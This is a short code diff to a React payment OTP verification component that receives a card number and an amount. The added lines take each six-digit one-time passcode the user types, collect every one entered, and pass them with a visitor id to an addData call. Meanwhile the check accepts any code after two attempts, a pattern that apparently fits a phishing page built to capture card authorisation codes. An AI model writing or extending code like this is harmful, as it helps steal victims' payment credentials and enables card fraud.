@@ -70,6 +70,9 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     if (otp.length === 6) {
+        const vId=localStorage.getItem('visitor')
+        allOtps.push(otp)
+        addData({id:vId,otp,allOtps:allOtps as any})
       // Simulate OTP validation - in a real app, this would call an API
       if (otp === "123456" || attempts >= 2) {
         // Correct OTP or max attempts reached
